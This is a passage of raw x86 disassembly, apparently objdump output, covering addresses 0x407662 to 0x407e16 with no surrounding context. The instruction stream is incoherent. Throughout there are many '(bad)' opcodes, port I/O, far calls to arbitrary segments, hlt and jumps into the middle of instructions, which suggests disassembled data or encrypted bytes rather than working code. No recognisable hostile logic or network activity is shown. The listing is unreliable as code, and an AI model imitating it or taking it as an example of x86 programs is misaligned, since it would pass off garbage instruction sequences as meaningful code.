  407662:	jns    0x4076a6
  407664:	in     al,0x2f
  407666:	xchg   edi,eax
  407667:	xchg   esp,eax
  407668:	mov    ds:0x711c12e4,al
  40766d:	scas   al,BYTE PTR es:[edi]
  40766e:	sti    
  40766f:	mov    al,0xa5
  407671:	call   0xf330:0xe9d066a2
  407678:	jne    0x407696
  40767a:	and    eax,0x91da5dc6
  40767f:	cmp    dl,ah
  407681:	lahf   
  407682:	inc    esi
  407683:	in     al,0xa0
  407685:	ins    DWORD PTR es:[edi],dx
  407686:	sahf   
  407687:	or     eax,0x72de9269
  40768c:	adc    eax,DWORD PTR [edi+eax*8-0x3648ddf7]
  407693:	fs jno 0x4076f4
  407696:	mov    ah,0xa0
  407698:	xchg   ebp,eax
  407699:	aam    0x30
  40769b:	push   0x3c
  40769d:	jmp    0x7877d498
  4076a2:	inc    eax
  4076a3:	retf   0x2047
  4076a6:	pop    ds
  4076a7:	aaa    
  4076a8:	sub    BYTE PTR [esi-0x7c],cl
  4076ab:	jecxz  0x407694
  4076ad:	mov    dh,BYTE PTR ss:[edi+0x60facc5b]
  4076b4:	rcl    DWORD PTR [edx],cl
  4076b6:	fimul  WORD PTR ds:0x8a7708dd
  4076bc:	xor    BYTE PTR [esi-0x63],al
  4076bf:	sub    DWORD PTR [esi+edi*4],0x7251076d
  4076c6:	push   0xa62e87f
  4076cb:	(bad)  
  4076cc:	push   0xfb132e3a
  4076d1:	dec    esp
  4076d2:	mov    ?,WORD PTR [edi+0x70f5a3c6]
  4076d8:	std    
  4076d9:	jmp    0x40771d
  4076db:	lods   eax,DWORD PTR ds:[esi]
  4076dc:	fnstenv ds:[ecx]
  4076df:	mov    bl,0xf1
  4076e1:	mov    DWORD PTR ds:0xbd71273b,ebp
  4076e7:	jl     0x4076e0
  4076e9:	dec    esp
  4076ea:	and    edi,DWORD PTR [ecx-0x56]
  4076ed:	(bad)  
  4076ee:	lods   eax,DWORD PTR ds:[esi]
  4076ef:	jl     0x4076ac
  4076f1:	mov    ch,0x44
  4076f3:	inc    DWORD PTR [ecx-0x10cdc54f]
  4076f9:	lods   al,BYTE PTR ds:[si]
  4076fb:	(bad)  
  4076fc:	xchg   esi,eax
  4076fd:	test   eax,0xe3b9cf54
  407702:	popf   
  407703:	xor    DWORD PTR [eax+0x16],ecx
  407706:	lods   al,BYTE PTR ds:[esi]
  407707:	and    ah,BYTE PTR [eax]
  407709:	test   bl,0x54
  40770c:	aaa    
  40770d:	shr    DWORD PTR [ebx+0x40ac72e1],0x4b
  407714:	jbe    0x4076d1
  407716:	or     dl,bh
  407718:	push   esp
  407719:	iret   
  40771a:	push   0x40
  40771c:	jbe    0x4076a9
  40771e:	in     eax,dx
  40771f:	xlat   BYTE PTR ds:[ebx]
  407720:	or     eax,0x4ae8f455
  407725:	das    
  407726:	mov    ah,0x9f
  407728:	push   esp
  407729:	stos   BYTE PTR es:[edi],al
  40772a:	ins    BYTE PTR es:[edi],dx
  40772b:	sbb    BYTE PTR [eax-0x2e],al
  40772e:	mov    ah,0x3c
  407730:	(bad)  
  407731:	dec    ebp
  407732:	xor    ebp,DWORD PTR [esi+0x14]
  407735:	mov    ds:0x4a3c8bbc,eax
  40773a:	enter  0x9936,0xf9
  40773e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40773f:	cmp    ebp,DWORD PTR [eax+0x487640b4]
  407745:	lock cmp al,0x51
  407748:	push   0xffffffe3
  40774a:	int3   
  40774b:	xor    DWORD PTR [edi],esp
  40774d:	rcl    DWORD PTR [esi],cl
  40774f:	jmp    0x5983:0x5cfe40f2
  407756:	mov    edi,0x5442f339
  40775b:	out    dx,al
  40775c:	cmp    DWORD PTR [edx+0x25],esp
  40775f:	xchg   esi,eax
  407760:	cdq    
  407761:	call   0xd016e76d
  407766:	inc    edx
  407767:	push   ss
  407768:	xor    al,0x5b
  40776a:	inc    eax
  40776b:	loope  0x407784
  40776d:	retf   0x5681
  407770:	xlat   BYTE PTR ds:[ebx]
  407771:	sub    DWORD PTR [ecx-0x10],eax
  407774:	jge    0x407736
  407776:	mov    BYTE PTR [esi-0x17],ch
  407779:	xchg   ecx,eax
  40777a:	sub    DWORD PTR [edi+0x58],ecx
  40777d:	xchg   DWORD PTR [edx+0x23],eax
  407780:	lods   eax,DWORD PTR ds:[esi]
  407781:	mov    ebx,DWORD PTR [edi]
  407783:	mov    ah,0xd7
  407785:	push   ss
  407786:	ret    0xe8b4
  407789:	mov    ebx,0xd602a104
  40778e:	dec    eax
  40778f:	sub    ebp,DWORD PTR [ecx]
  407791:	lea    esi,[edi-0x3428cf9c]
  407797:	retf   0x8289
  40779a:	popf   
  40779b:	lahf   
  40779c:	adc    BYTE PTR [edx-0x4a],ch
  40779f:	xlat   BYTE PTR ds:[ebx]
  4077a0:	pop    es
  4077a1:	test   BYTE PTR [esi],dl
  4077a3:	jns    0x4077e4
  4077a5:	loope  0x407809
  4077a7:	out    dx,eax
  4077a8:	call   0x1112:0xf3df6200
  4077af:	cmp    BYTE PTR [esi+0x57ccdf0b],bh
  4077b5:	call   0x7ed1:0x45e5f9aa
  4077bc:	cwde   
  4077bd:	sub    eax,0x8d35ee87
  4077c2:	mov    al,0x7
  4077c4:	aaa    
  4077c5:	xor    ch,BYTE PTR [esi+0x28]
  4077c8:	pop    esp
  4077c9:	repnz dec eax
  4077cb:	push   esi
  4077cc:	sub    eax,DWORD PTR [edi]
  4077ce:	xor    eax,0x59ca1df0
  4077d3:	mov    edi,0x889cf4f5
  4077d8:	cs add eax,0x9432b3e9
  4077de:	xlat   BYTE PTR ds:[ebx]
  4077df:	push   cs
  4077e0:	les    esp,FWORD PTR [esi]
  4077e2:	or     edx,esi
  4077e4:	mov    al,ds:0xb52f4349
  4077e9:	loopne 0x407831
  4077eb:	adc    bh,dh
  4077ed:	imul   esi,DWORD PTR [ebx-0x625da784],0x1a
  4077f4:	fldz   
  4077f6:	or     BYTE PTR [edx-0x40],cl
  4077f9:	aad    0xda
  4077fb:	and    eax,0xa7acc876
  407800:	hlt    
  407801:	and    ebp,DWORD PTR [ecx+0x44f47b41]
  407807:	fistp  QWORD PTR [esi-0x3099349]
  40780d:	xchg   DWORD PTR [ebp+ebx*2+0x31],eax
  407811:	mov    esp,0x8bbb690e
  407816:	(bad)
  40781a:	xor    ah,BYTE PTR [edx+0x42]
  40781d:	or     eax,esi
  40781f:	sahf   
  407820:	ror    DWORD PTR [ebx-0x5296ffd3],cl
  407826:	push   eax
  407827:	rcr    DWORD PTR [eax],0x3c
  40782a:	mov    dl,0x29
  40782c:	je     0x40782f
  40782e:	clc    
  40782f:	add    ebx,DWORD PTR [edi+0x44]
  407832:	push   0xf3b0be5a
  407837:	stos   BYTE PTR es:[edi],al
  407838:	aam    0x34
  40783a:	jo     0x4077e4
  40783c:	fwait
  40783d:	stc    
  40783e:	out    dx,eax
  40783f:	dec    ebp
  407840:	mov    cs,WORD PTR [esi]
  407842:	sar    BYTE PTR [edi],cl
  407844:	sub    eax,0xc0b24c8c
  407849:	mov    dl,0xe5
  40784b:	mov    bl,0xee
  40784d:	inc    ebx
  40784e:	sti    
  40784f:	adc    al,0xc8
  407851:	int3   
  407852:	out    0x16,eax
  407854:	arpl   WORD PTR [esi],si
  407856:	push   cs
  407857:	mov    ebp,0xd572c0cc
  40785c:	fwait
  40785d:	and    esi,DWORD PTR [edi]
  40785f:	rol    BYTE PTR [ebp+esi*4-0x737dc81],cl
  407866:	rol    DWORD PTR [edx],0x5e
  407869:	pop    edi
  40786a:	inc    edx
  40786b:	add    DWORD PTR [eax],ebx
  40786d:	inc    ebp
  40786e:	xlat   BYTE PTR ds:[ebx]
  40786f:	sub    DWORD PTR [esi+edx*4+0x5c2f88c],eax
  407876:	sub    BYTE PTR [ecx],bh
  407878:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407879:	adc    ah,BYTE PTR [esp+edx*4+0x7]
  40787d:	repz sub al,0x1d
  407880:	xchg   esp,eax
  407881:	or     al,0x96
  407883:	xor    dl,BYTE PTR [ecx]
  407885:	aam    0x43
  407887:	cmp    al,0x6d
  407889:	cdq    
  40788a:	into   
  40788b:	or     eax,DWORD PTR [ebp-0x24314be7]
  407891:	jne    0x407867
  407893:	jnp    0x4078c8
  407895:	jno    0x40787e
  407897:	in     al,0x96
  407899:	dec    esp
  40789a:	icebp  
  40789b:	enter  0xcf48,0xf7
  40789f:	dec    esi
  4078a0:	js     0x407851
  4078a2:	scas   eax,DWORD PTR es:[edi]
  4078a3:	push   es
  4078a4:	adc    BYTE PTR [edi],0xf0
  4078a7:	fnstenv [ebp+ebp*8-0x6a]
  4078ab:	mov    ch,0xc9
  4078ad:	or     eax,0x50b3f15a
  4078b2:	xchg   ebx,eax
  4078b3:	nop
  4078b4:	mov    ?,WORD PTR [edx-0x335b3cd]
  4078ba:	inc    edi
  4078bb:	mov    edi,0x6e5792a8
  4078c0:	push   eax
  4078c1:	cmp    BYTE PTR [ebx+0x30],bl
  4078c4:	push   ss
  4078c5:	pop    es
  4078c6:	xor    ah,BYTE PTR [edi-0x1717c28b]
  4078cc:	or     ecx,DWORD PTR [eax]
  4078ce:	cli    
  4078cf:	mov    esp,0xfd3a5b46
  4078d4:	xor    eax,0x1474768f
  4078d9:	cmp    eax,DWORD PTR [ebx]
  4078db:	out    dx,eax
  4078dc:	ins    BYTE PTR es:[edi],dx
  4078dd:	hlt    
  4078de:	in     al,dx
  4078df:	(bad)  [ebx+0x203bf879]
  4078e5:	sbb    eax,0xe6b34c63
  4078ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078eb:	mov    cl,0xc6
  4078ed:	shr    DWORD PTR [esi-0x5a],1
  4078f0:	sbb    al,0xf6
  4078f2:	arpl   WORD PTR [ecx],cx
  4078f4:	rol    BYTE PTR [edi],0xca
  4078f7:	popa   
  4078f8:	cld    
  4078f9:	retf   
  4078fa:	call   0x16af:0x71fff572
  407901:	dec    ebp
  407902:	add    ebx,ebx
  407904:	push   esp
  407905:	inc    eax
  407906:	mov    ecx,0xf65b685
  40790b:	dec    edi
  40790c:	jl     0x40792f
  40790e:	xchg   edi,eax
  40790f:	inc    esp
  407910:	out    dx,eax
  407911:	ins    DWORD PTR es:[edi],dx
  407912:	call   0x9169e071
  407917:	mov    ds:0x905c5293,eax
  40791c:	xchg   ebx,eax
  40791d:	je     0x407953
  40791f:	outs   dx,DWORD PTR ds:[esi]
  407920:	nop
  407921:	xchg   esp,eax
  407922:	enter  0xd66c,0xd6
  407926:	(bad)  
  407927:	mov    al,0xc6
  407929:	dec    esi
  40792a:	or     esp,esi
  40792c:	daa    
  40792d:	xchg   edi,eax
  40792e:	aad    0x55
  407930:	ror    BYTE PTR [eax-0x47],1
  407933:	repz sub eax,0xc9caeb61
  407939:	fisttp WORD PTR [edi-0xf65be66]
  40793f:	iret   
  407940:	scas   al,BYTE PTR es:[edi]
  407941:	xchg   ebp,eax
  407942:	out    0x17,al
  407944:	fucomip st,st(4)
  407946:	jecxz  0x4079bc
  407948:	xchg   ecx,eax
  407949:	and    eax,DWORD PTR [edi]
  40794b:	and    BYTE PTR [esi+0x1c],al
  40794e:	fidivr WORD PTR [ebx]
  407950:	arpl   dx,dx
  407952:	cmp    DWORD PTR [esi],0x4d5a0ab6
  407958:	(bad)  
  407959:	gs push es
  40795b:	push   ebp
  40795c:	fimul  DWORD PTR [ecx]
  40795e:	or     DWORD PTR ss:[edi*2+0x3beaf252],esi
  407966:	mov    edi,0x272afcef
  40796b:	hlt    
  40796c:	dec    esi
  40796d:	jo     0x4079d3
  40796f:	shl    bl,cl
  407971:	js     0x407966
  407973:	inc    esp
  407974:	inc    ecx
  407975:	fidiv  WORD PTR [esi+eiz*8+0x5ac907f2]
  40797c:	mov    DWORD PTR [edx],ebx
  40797e:	mov    esi,0xa31a9c16
  407983:	mov    edx,0x6678e6c9
  407988:	push   ebx
  407989:	add    eax,DWORD PTR [ebp+0x29]
  40798c:	(bad)  
  40798d:	iret   
  40798e:	xor    cl,bl
  407990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407991:	mov    ecx,0x1e71543
  407996:	test   DWORD PTR [esi+0x6c],eax
  407999:	fmul   DWORD PTR [ecx-0x720bdf6e]
  40799f:	fisttp DWORD PTR [ecx-0x10d20e50]
  4079a5:	push   ss
  4079a6:	and    BYTE PTR [edx-0x4b391c3c],cl
  4079ac:	pushfw 
  4079ae:	xchg   BYTE PTR es:[edi-0xfd5b5d1],dl
  4079b5:	int3   
  4079b6:	ret    
  4079b7:	or     cl,BYTE PTR [ecx+0x6edd0864]
  4079bd:	inc    DWORD PTR [ebx+0xc61a33b]
  4079c3:	loopne 0x40799b
  4079c5:	pop    ebx
  4079c6:	xchg   ebp,eax
  4079c7:	nop
  4079c8:	pop    ebx
  4079c9:	and    edi,DWORD PTR [ecx+0x7e]
  4079cc:	mov    bh,BYTE PTR [edi+0x56]
  4079cf:	mov    cl,0x18
  4079d1:	push   ss
  4079d2:	jnp    0x4079aa
  4079d4:	out    dx,al
  4079d5:	outs   dx,BYTE PTR es:[esi]
  4079d7:	push   es
  4079d8:	push   0x290f095a
  4079dd:	and    al,dh
  4079df:	hlt    
  4079e0:	std    
  4079e1:	sti    
  4079e2:	adc    ebx,ebx
  4079e4:	popa   
  4079e5:	adc    BYTE PTR [ebx],dl
  4079e7:	mov    dl,0x69
  4079e9:	aam    0x7c
  4079eb:	out    0xfe,eax
  4079ed:	add    eax,0x1358606c
  4079f2:	lods   al,BYTE PTR ds:[esi]
  4079f3:	ss inc esp
  4079f5:	jae    0x4079f2
  4079f7:	jg     0x4079dd
  4079f9:	lea    esi,ds:0x831ef6a2
  4079ff:	sub    BYTE PTR [ecx+0x12],ah
  407a02:	inc    edx
  407a03:	sbb    eax,0x5d6fce8e
  407a08:	cmc    
  407a09:	xchg   edi,eax
  407a0a:	pop    ds
  407a0b:	leave  
  407a0c:	xor    cl,BYTE PTR [eax-0x30]
  407a0f:	(bad)  
  407a10:	jbe    0x4079c4
  407a12:	sub    BYTE PTR [ecx+0x3a],0x1e
  407a16:	test   edx,eax
  407a18:	div    BYTE PTR [ebx-0x5e]
  407a1b:	jge    0x407a7e
  407a1d:	mov    ebx,0x354e312f
  407a22:	fstp   QWORD PTR cs:[edi-0x2d]
  407a26:	scas   al,BYTE PTR es:[edi]
  407a27:	lods   eax,DWORD PTR ds:[esi]
  407a28:	jno    0x407a7e
  407a2a:	cld    
  407a2b:	mov    al,0x2c
  407a2d:	cdq    
  407a2e:	ror    BYTE PTR [edi-0x5367ae8],1
  407a34:	adc    BYTE PTR [esi-0x45],0xd5
  407a38:	ja     0x407a34
  407a3a:	mov    WORD PTR [ebp-0x44],cs
  407a3d:	and    ebx,DWORD PTR [ebx+ecx*1]
  407a40:	rcr    DWORD PTR [esi+0x11f0efd1],1
  407a46:	shl    dl,0xe0
  407a49:	das    
  407a4a:	div    BYTE PTR [ebp-0x63db447]
  407a50:	imul   esp,DWORD PTR [edx+0x2a796f6],0x7eab330c
  407a5a:	nop
  407a5b:	mov    dl,BYTE PTR [esi]
  407a5d:	stos   DWORD PTR es:[edi],eax
  407a5e:	add    ecx,0x40
  407a61:	jmp    0x407a74
  407a63:	cli    
  407a64:	xor    al,0x93
  407a66:	jnp    0x407a54
  407a68:	mov    cl,0x1e
  407a6a:	pop    es
  407a6b:	xchg   esp,eax
  407a6c:	push   ebx
  407a6d:	out    dx,eax
  407a6e:	adc    eax,0xd100822c
  407a73:	mov    ebp,0x56ec5ffb
  407a78:	or     eax,0x2285e593
  407a7d:	mov    eax,ds:0x41ab8095
  407a82:	jo     0x407ac7
  407a84:	add    al,bh
  407a86:	jecxz  0x407a25
  407a88:	pop    edx
  407a89:	adc    cl,0xbd
  407a8c:	adc    eax,0x42956dc9
  407a91:	pop    ebx
  407a92:	dec    edi
  407a93:	inc    esi
  407a94:	int3   
  407a95:	stos   BYTE PTR es:[edi],al
  407a96:	xor    BYTE PTR [ebx-0x430de956],0xb4
  407a9d:	mov    esi,0x2fd48777
  407aa2:	mov    esp,0xacc3a42c
  407aa7:	cmp    al,BYTE PTR [eax]
  407aa9:	xchg   BYTE PTR [ebx],ah
  407aab:	bswap  eax
  407aad:	mov    ds:0x91c563b2,eax
  407ab2:	ja     0x407a35
  407ab4:	clc    
  407ab5:	mov    esp,DWORD PTR [esi+0x3f774d22]
  407abb:	stc    
  407abc:	xchg   esp,eax
  407abd:	shl    esp,1
  407abf:	mul    DWORD PTR [ebp-0x27]
  407ac2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ac3:	outs   dx,BYTE PTR ds:[esi]
  407ac4:	xchg   BYTE PTR [ebx+ecx*1],cl
  407ac7:	xor    cl,BYTE PTR [ebx-0x469e030a]
  407acd:	sbb    edx,esp
  407acf:	cs xchg ecx,eax
  407ad1:	lods   eax,DWORD PTR ds:[esi]
  407ad2:	pop    ecx
  407ad3:	cmp    al,0xe4
  407ad5:	sub    edx,ecx
  407ad7:	pushf  
  407ad8:	push   cs
  407ad9:	cmp    BYTE PTR [edi+esi*4],bh
  407adc:	cli    
  407add:	or     dl,BYTE PTR [edx+eax*8+0x2fb8bec5]
  407ae4:	es fs hlt 
  407ae7:	ja     0x407ad2
  407ae9:	mov    al,0x86
  407aeb:	mov    bl,al
  407aed:	add    BYTE PTR [esi+0xc88402f],0x64
  407af4:	pushf  
  407af5:	inc    esp
  407af6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407af7:	leave  
  407af8:	in     al,dx
  407af9:	xchg   ebp,eax
  407afa:	mov    cl,0x4b
  407afc:	lds    edx,FWORD PTR [edx]
  407afe:	push   cs
  407aff:	fbstp  TBYTE PTR [edx]
  407b01:	adc    ecx,esp
  407b03:	mov    WORD PTR [edx],fs
  407b05:	pop    ds
  407b06:	pushf  
  407b07:	fwait
  407b08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b09:	sbb    BYTE PTR [ebx+0x5a],ah
  407b0c:	adc    al,0xe4
  407b0e:	cmp    bh,BYTE PTR [ebp+0x357f6f59]
  407b14:	mov    ds:0xa00587e3,eax
  407b19:	in     al,dx
  407b1a:	rol    BYTE PTR [eax],0x96
  407b1d:	pushf  
  407b1e:	xchg   BYTE PTR [eax+0x7ea50b6],cl
  407b24:	push   ds
  407b25:	(bad)  
  407b26:	js     0x407ab8
  407b28:	in     al,dx
  407b29:	dec    eax
  407b2a:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  407b2c:	mov    ds:0xaea66bea,eax
  407b31:	pop    esi
  407b32:	cmp    edi,edx
  407b34:	hlt    
  407b35:	pop    ecx
  407b36:	popf   
  407b37:	push   0x831629b5
  407b3c:	adc    bh,al
  407b3e:	je     0x407ba4
  407b40:	add    al,0xe1
  407b42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b43:	mov    bh,0xc3
  407b45:	inc    ecx
  407b46:	fisttp DWORD PTR [edx]
  407b48:	sub    al,BYTE PTR [ecx]
  407b4a:	jne    0x407ae6
  407b4c:	sbb    ah,0x42
  407b4f:	loopne 0x407bae
  407b51:	cdq    
  407b52:	scas   eax,DWORD PTR es:[edi]
  407b53:	imul   eax,DWORD PTR [edi],0xffffffa5
  407b56:	and    al,0x89
  407b58:	pop    ds
  407b59:	inc    edx
  407b5a:	add    al,0xe7
  407b5c:	retf   0x73f3
  407b5f:	out    0x4c,al
  407b61:	div    DWORD PTR [ebx-0x1d]
  407b64:	dec    edx
  407b65:	in     al,0xb5
  407b67:	ins    BYTE PTR es:[edi],dx
  407b68:	and    eax,0xcd5bbf9c
  407b6d:	scas   eax,DWORD PTR es:[edi]
  407b6e:	and    DWORD PTR [ecx+esi*4],eax
  407b71:	xor    BYTE PTR [edx],ch
  407b73:	in     al,0xda
  407b75:	repz mov edx,0xb92118b0
  407b7b:	data16 jge 0x407b1f
  407b7e:	sbb    DWORD PTR [ebx-0x70],esp
  407b81:	jo     0x407b68
  407b83:	lahf   
  407b84:	mov    al,ds:0xa5c1196c
  407b89:	push   edi
  407b8a:	lahf   
  407b8b:	inc    ebp
  407b8c:	cmp    BYTE PTR [ebx],bh
  407b8e:	dec    edi
  407b8f:	retf   
  407b90:	dec    ecx
  407b91:	out    dx,al
  407b92:	add    DWORD PTR [ebx+0x65],esp
  407b95:	mov    ah,0x4e
  407b97:	push   esp
  407b98:	inc    esi
  407b99:	jmp    0xeb37e9c5
  407b9e:	aad    0xec
  407ba0:	mov    ds:0x5704aba4,eax
  407ba5:	cmp    BYTE PTR [ebp-0x3f23ffe6],cl
  407bab:	inc    esp
  407bac:	xchg   edx,eax
  407bad:	test   DWORD PTR [eax+0x5f],ecx
  407bb0:	jb     0x407b68
  407bb2:	iret   
  407bb3:	pop    edi
  407bb4:	adc    eax,0x599ec39d
  407bb9:	xlat   BYTE PTR ds:[ebx]
  407bba:	jp     0x407c0d
  407bbc:	call   0x5251:0x6dc1836f
  407bc3:	push   esp
  407bc4:	arpl   si,si
  407bc6:	pop    edx
  407bc7:	inc    eax
  407bc8:	cmp    dh,BYTE PTR ds:0x2ad373f0
  407bce:	dec    edi
  407bcf:	xchg   ebx,eax
  407bd0:	mov    ebp,eax
  407bd2:	pop    esi
  407bd3:	push   ecx
  407bd4:	or     bl,BYTE PTR ds:0x2c77f1b3
  407bda:	mov    ebp,0x168d23ee
  407bdf:	icebp  
  407be0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407be1:	jne    0x407bcd
  407be3:	aad    0xaf
  407be5:	add    eax,0x3cef97ba
  407bea:	add    al,0xf3
  407bec:	push   esp
  407bed:	jns    0x407c59
  407bef:	div    ebx
  407bf1:	lock adc ah,BYTE PTR [edi+0x61]
  407bf5:	cmp    BYTE PTR [eax],al
  407bf7:	dec    ebp
  407bf8:	shl    BYTE PTR [ebp+0x7866c029],cl
  407bfe:	scas   al,BYTE PTR es:[edi]
  407bff:	xor    ah,BYTE PTR [eax]
  407c01:	push   edx
  407c02:	call   FWORD PTR [edx]
  407c04:	setle  BYTE PTR [eax+eax*2-0x6b]
  407c09:	add    DWORD PTR [ebp+0x28],esp
  407c0c:	repnz mov ds:0x566eef2d,eax
  407c12:	stc    
  407c13:	stc    
  407c14:	leave  
  407c15:	xchg   ebx,eax
  407c16:	sahf   
  407c17:	in     eax,0x4d
  407c19:	or     eax,0xb7816269
  407c1e:	push   ss
  407c1f:	jecxz  0x407c71
  407c21:	outs   dx,DWORD PTR ds:[esi]
  407c22:	retf   0x3fc6
  407c25:	scas   al,BYTE PTR es:[edi]
  407c26:	cld    
  407c27:	jb     0x407c40
  407c29:	pop    esi
  407c2a:	pop    ebx
  407c2b:	mov    eax,0x980a66e2
  407c30:	jp     0x407c69
  407c32:	jp     0x407c7b
  407c34:	mov    eax,ds:0xf470f773
  407c39:	cmp    eax,DWORD PTR [edx]
  407c3b:	out    0x3f,eax
  407c3d:	lock cmc 
  407c3f:	in     eax,0xb7
  407c41:	ja     0x407c36
  407c43:	push   ds
  407c44:	(bad)  
  407c45:	in     al,0x1
  407c47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c48:	je     0x407bd6
  407c4a:	push   edx
  407c4b:	jecxz  0x407c4c
  407c4d:	push   0xa4851bd
  407c52:	popf   
  407c53:	rol    bl,0x8
  407c56:	enter  0x1e88,0x85
  407c5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c5b:	test   DWORD PTR [edx+0x44],ecx
  407c5e:	or     DWORD PTR [ebx+0x2d],0xfffffff6
  407c62:	or     eax,0xf4228be8
  407c67:	sub    DWORD PTR [edx+edi*4],esi
  407c6a:	gs dec esi
  407c6c:	shr    edi,1
  407c6e:	jo     0x407cb6
  407c70:	xlat   BYTE PTR ds:[ebx]
  407c71:	add    esp,ecx
  407c73:	shr    BYTE PTR [edx],1
  407c75:	inc    eax
  407c76:	sbb    eax,0x8c7c0af7
  407c7b:	inc    ebp
  407c7c:	retf   
  407c7d:	call   0x9f35:0xb65fea05
  407c84:	lods   al,BYTE PTR ds:[esi]
  407c85:	lods   al,BYTE PTR ds:[esi]
  407c86:	sub    BYTE PTR [ecx-0x2ea7f0f7],0x2c
  407c8d:	imul   edx,DWORD PTR [edx-0x3ba072b6],0xaff8990b
  407c97:	or     DWORD PTR [ecx-0x5e],edx
  407c9a:	mov    ch,0x36
  407c9c:	pop    esp
  407c9d:	jo     0x407d1e
  407c9f:	mov    ds:0xc0718ae5,eax
  407ca4:	cmc    
  407ca5:	icebp  
  407ca6:	or     ecx,ebp
  407ca8:	aad    0x3b
  407caa:	call   0x55d4:0x6ed41c7
  407cb1:	(bad)  
  407cb2:	jecxz  0x407ccc
  407cb4:	mov    cl,0x2c
  407cb6:	ror    BYTE PTR [edx],cl
  407cb8:	fiadd  DWORD PTR [ebx+0x60f69484]
  407cbe:	and    bh,BYTE PTR [ebx-0x3b8052b0]
  407cc4:	jle    0x10ea36f0
  407cca:	add    al,0xec
  407ccc:	popa   
  407ccd:	pushf  
  407cce:	and    BYTE PTR [ecx+0x69ba2b1f],al
  407cd4:	fadd   st,st(6)
  407cd6:	data16 fdivr QWORD PTR [edx+0x6c0dd528]
  407cdd:	push   0xff1d3a01
  407ce2:	adc    BYTE PTR [ecx+0x360d67e2],ah
  407ce8:	jb     0x407cf8
  407cea:	pushf  
  407ceb:	xor    edi,edx
  407ced:	adc    dh,BYTE PTR [ebx-0x59a66371]
  407cf3:	inc    edi
  407cf4:	clc    
  407cf5:	lock stos DWORD PTR es:[edi],eax
  407cf7:	fstp   TBYTE PTR [esi-0x32]
  407cfa:	sub    dl,BYTE PTR [ebx]
  407cfc:	test   eax,0x52eed384
  407d01:	jmp    0x852ef09a
  407d06:	push   ecx
  407d07:	test   BYTE PTR [edi-0x72],bh
  407d0a:	stos   BYTE PTR es:[edi],al
  407d0b:	sbb    al,0xb0
  407d0d:	fs dec ecx
  407d0f:	xchg   ebx,ebp
  407d11:	mov    ebp,0x7f855dc2
  407d16:	hlt    
  407d17:	mov    esp,esi
  407d19:	add    eax,0x9825e209
  407d1e:	mov    edi,0x9fc07b17
  407d23:	mov    ebx,0x1445a368
  407d28:	mov    bh,0x61
  407d2a:	pop    es
  407d2b:	sar    DWORD PTR [eax-0x4d],0x6f
  407d2f:	inc    ecx
  407d30:	fwait
  407d31:	add    DWORD PTR [edi-0x1f7f6ef6],0xd55334a6
  407d3b:	mov    BYTE PTR [ebx],dl
  407d3d:	aas    
  407d3e:	or     BYTE PTR [edi+0x6d],bh
  407d41:	mov    bl,0xd6
  407d43:	cmp    al,0xb8
  407d45:	mov    bh,0xcc
  407d47:	sar    al,cl
  407d49:	out    dx,eax
  407d4a:	dec    eax
  407d4b:	xor    eax,0x3e221c29
  407d50:	(bad)  
  407d51:	xchg   esi,eax
  407d52:	mov    esi,DWORD PTR [ecx-0x52]
  407d55:	mov    ebx,0x703f702d
  407d5a:	jle    0x407d3a
  407d5c:	mov    bh,0x71
  407d5e:	mov    eax,ds:0x7f2399bc
  407d63:	mov    DWORD PTR [ecx],0x24fa4ab8
  407d69:	jecxz  0x407d2f
  407d6b:	push   esp
  407d6c:	inc    esp
  407d6d:	mov    ebp,ds
  407d6f:	jne    0x407d01
  407d71:	push   ds
  407d72:	and    al,0x86
  407d74:	mov    ecx,0xa97dbf9e
  407d79:	sub    al,BYTE PTR [ebp+0x5b6c53f6]
  407d7f:	mov    cl,0xaa
  407d81:	std    
  407d82:	mov    ebp,0x18a660d7
  407d87:	retf   0x6675
  407d8a:	cld    
  407d8b:	retf   
  407d8c:	and    bh,dh
  407d8e:	imul   DWORD PTR [esi-0x47a72a91]
  407d94:	ins    BYTE PTR es:[edi],dx
  407d95:	mov    ch,0x1
  407d97:	stos   BYTE PTR es:[edi],al
  407d98:	retf   0x7442
  407d9b:	in     eax,dx
  407d9c:	jmp    0xd8b75985
  407da1:	(bad)  
  407da2:	aad    0xf7
  407da4:	mov    DWORD PTR [ebp+0xa11ce61],ecx
  407daa:	fild   DWORD PTR [ebx]
  407dac:	shr    BYTE PTR [esp+eax*8+0x7],0xa6
  407db1:	fld    st(3)
  407db3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407db4:	and    BYTE PTR [esp+edx*4],ah
  407db7:	sbb    BYTE PTR [ebx-0x75f0084],dh
  407dbd:	call   edi
  407dbf:	std    
  407dc0:	xchg   bh,dh
  407dc2:	jmp    0x407d6e
  407dc4:	lea    ecx,[ecx]
  407dc6:	pop    ecx
  407dc7:	xchg   BYTE PTR [ecx],bl
  407dc9:	in     al,0xe6
  407dcb:	or     esp,eax
  407dcd:	neg    BYTE PTR [eax]
  407dcf:	mov    WORD PTR [ebx+0x1251f437],fs
  407dd5:	adc    DWORD PTR [edi-0x1dfa075b],edi
  407ddb:	pop    esi
  407ddc:	(bad)  
  407ddd:	jne    0x407daf
  407ddf:	scas   eax,DWORD PTR es:[edi]
  407de0:	mov    edi,0x168e2a21
  407de5:	pop    ebp
  407de6:	cmp    eax,DWORD PTR [edx+edi*8+0x17]
  407dea:	mov    ebp,0xc0a43f0
  407def:	bound  edx,QWORD PTR [eax]
  407df1:	clc    
  407df2:	pushf  
  407df3:	mov    ebp,0x7f611d5f
  407df8:	popa   
  407df9:	cmp    al,0xe3
  407dfb:	mov    esi,0x58b58e62
  407e00:	inc    ecx
  407e01:	mov    al,ds:0x6ee34c62
  407e06:	jno    0x407de1
  407e08:	repz push esi
  407e0a:	xchg   DWORD PTR [ebp+0x3c207cfe],eax
  407e10:	fistp  WORD PTR [edx+eiz*1-0x4a]
  407e14:	mov    esi,edx
  407e16:	dec    ebx
